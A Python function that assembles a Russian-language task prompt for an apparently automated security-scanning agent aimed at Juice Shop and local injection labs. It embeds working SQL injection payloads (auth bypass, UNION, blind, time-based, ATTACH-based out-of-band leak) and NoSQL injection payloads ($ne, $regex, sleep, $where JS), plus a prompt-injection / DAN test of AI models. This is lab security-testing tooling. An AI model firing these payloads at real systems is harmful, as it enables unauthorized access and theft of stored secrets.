import os

def build_task(args) -> str:
    if args.task:
        return args.task
    source_path = args.source or os.getenv("SOURCE_PATH", "/app/juice-shop")
    target_url = args.url or os.getenv("TARGET_URL", "http://juice-shop:3000")
    rules_path = args.rules or os.getenv("RULES_PATH", "/app/rules/rules_semgrep.yaml")
    sqli_lab_url = args.sqli_lab_url or os.getenv("SQLI_LAB_URL", "")
    sqli_source = args.sqli_source or os.getenv("SQLI_SOURCE_PATH", "")
    nosqli_lab_url = args.nosqli_lab_url or os.getenv("NOSQLI_LAB_URL", "")
    nosqli_source = args.nosqli_source or os.getenv("NOSQLI_SOURCE_PATH", "")
    zap_url = args.zap_url or os.getenv("ZAP_URL", "")
    dan_lab_url = os.getenv("DAN_LAB_URL", "")
    parts = [f"Проведи анализ защищённости приложения {target_url}."]
    if not args.no_idor:
        parts.append(
            f"Проверь IDOR на точке входа {args.idor_endpoint} "
            f"с id='{args.idor_id}' и токеном '{args.idor_token}'."
        )
    if not args.no_semgrep:
        parts.append(f"Запусти Semgrep на {source_path} с правилами {rules_path}.")
    if not args.no_zap and zap_url:
        parts.append(f"Запусти ZAP-скан ({args.zap_mode}) на {zap_url}.")
    if not args.no_nuclei:
        parts.append(f"Запусти Nuclei на {target_url} для поиска известных уязвимостей.")
    if not args.no_sqli_lab and sqli_lab_url:
        parts.append(
            f"Проведи анализ SQLi на стенде {sqli_lab_url}. "
            "Проверь эндпоинты: "
            "1) /api/login с payload \"' OR 1=1-- -\" (auth bypass); "
            "2) /api/login с payload "
            "\"x' UNION SELECT id, secret_usser, secret_usser "
            "FROM Secrets-- -\" (union); "
            "3) /api/check_user с payload \"1' AND 1=1-- -\" и "
            "\"1' AND 1=2-- -\" (blind boolean); "
            "4) /api/check_user_slow с payload \"admin\" и "
            "\"' OR (SELECT length(randomblob(100000000)))>0 "
            "AND 1=1-- -\" (time-based); "
            "5) /api/oob с payload "
            "\"admin'; ATTACH DATABASE 'oob_channel/leak.db' "
            "AS leak; CREATE TABLE leak.d(x); "
            "INSERT INTO leak.d SELECT secret_usser "
            "FROM Secrets; --\" (OOB)."
        )
        if sqli_source:
            parts.append(f"Запусти Semgrep на {sqli_source}.")
    if not args.no_nosqli_lab and nosqli_lab_url:
        parts.append(
            f"Проведи анализ NoSQLi на стенде {nosqli_lab_url}. "
            "Проверь эндпоинты: "
            "1) POST /api/login с payload "
            "{\"username\":\"admin\","
            "\"password\":{\"$ne\":null}} (auth bypass); "
            "2) GET /api/check_user с payload "
            "?username=admin&password[$regex]=^S (blind boolean); "
            "3) GET /api/check_user_slow с payload "
            "?username=admin&where=sleep(3000)||true (blind time); "
            "4) GET /api/search с payload "
            "?q=1';return this.hidden// (JS-injection в $where)."
        )  
        if nosqli_source:
            parts.append(f"Запусти Semgrep на {nosqli_source}.")
    if dan_lab_url:
        parts.append(
            f"Проведи анализ Prompt Injection / DAN на стенде {dan_lab_url}. "
            "Используй инструмент test_dan."
        )
    parts.append("Опиши найденные уязвимости с критичностью и рекомендациями.")
    return " ".join(parts)